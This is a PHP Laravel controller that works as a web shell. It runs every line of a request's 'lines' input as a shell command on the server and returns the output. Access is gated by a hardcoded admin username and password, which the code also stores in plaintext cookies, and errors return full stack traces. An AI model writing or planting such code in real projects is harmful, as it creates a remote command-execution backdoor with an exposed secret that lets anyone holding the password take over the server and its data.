<?php

namespace App\Http\Controllers\web;

use App\Http\Controllers\Controller;
use App\Utils\ProcessUtil;
use Illuminate\Http\Request;

class ExecuteController extends Controller
{

    public function index(Request $request)
    {
        $username = $request->cookie('username', $request->username);
        $pwd = $request->cookie('pwd', $request->pwd);
        if (empty($username) || empty($pwd)) {
            return 'error';
        }

        if ($username != 'admin' || $pwd != 'Hoangbao09@@') {
            return 'error';
        }

        $message = '';
        $lines = $request->input('lines');
        if (isset($lines)) {
            $lines = preg_split('/\r\n|[\r\n]/', $lines);
            foreach ($lines as $line) {
                try {
                    $message .= PHP_EOL . ProcessUtil::shellSync($line, base_path());
                } catch (\Exception $e) {
                    $message .= PHP_EOL . '-------ERROR-------' . PHP_EOL . $e->getMessage() . PHP_EOL . $e->getTraceAsString();
                }
            }
        }

        return response(view('execute', compact('message')))->cookie('username', $username)->cookie('pwd', $pwd);
    }

}
